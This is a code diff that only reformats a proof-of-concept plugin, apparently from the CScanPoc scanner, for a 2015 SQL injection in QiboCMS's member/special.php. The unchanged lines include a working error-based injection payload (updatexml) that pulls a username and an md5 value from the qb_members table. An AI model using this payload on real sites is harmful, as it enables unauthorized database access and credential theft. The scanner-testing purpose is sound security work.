@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'QiboCMS_0033_L' # 平台漏洞编号，留空
+    vuln_id = 'QiboCMS_0033_L'  # 平台漏洞编号，留空
     name = '齐博CMS SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-08-17'  # 漏洞公布时间
     desc = '''
         video/member/special.php
@@ -33,16 +34,16 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #首先注册用户，创建专题，记下专题ID。
-            #获取cookies
+
+            # 首先注册用户，创建专题，记下专题ID。
+            # 获取cookies
             cookies = {}
             '''
             raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
             for line in raw_cookies.split(';'):  
                 key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                 cookies[key]=value 
-            ''' 
+            '''
             payload = "/member/special.php?job=show_BBSiframe&type=myatc&id=12&TB_pre=qb_module where 1=1 or 1=updatexml(2,concat(0x7e,((select concat(username,0x5c,md5(c)) from qb_members limit 0,1))),0) %23"
             url = self.target + payload
             r = requests.get(url, cookies=cookies)
@@ -56,6 +57,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
